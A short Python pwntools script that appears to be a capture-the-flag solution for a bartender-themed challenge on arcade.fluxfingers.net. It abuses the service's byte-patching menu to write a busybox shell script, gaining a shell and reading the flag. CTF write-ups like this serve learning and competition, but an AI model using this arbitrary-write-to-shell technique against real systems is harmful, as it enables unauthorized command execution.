#!/usr/bin/env python2

from pwn import *


p = remote('arcade.fluxfingers.net', 1812)

# select beer (could be any non-F.L.A.G. drink)
p.sendlineafter('> ', 'beer')

# tell the bartender she should mix it
p.sendlineafter('> ', '2')

# send the patch
p.sendlineafter('> ', 'y')
script = '#!/bin/busybox sh' + '\n' + 'sh'
for i in range(len(script)):
    p.sendlineafter('> ', 'M {:x} {:02x}'.format(i, ord(script[i])))
p.sendlineafter('> ', 'M {:x} 0a'.format(len(script)))
p.sendlineafter('> ', '')

p.recvuntil("Here's your beer:\n")
p.sendline('/app/recipes/gin/Fruity\\ Light-Absorbing\\ Gin')
log.success('Flag: ' + p.recvline())

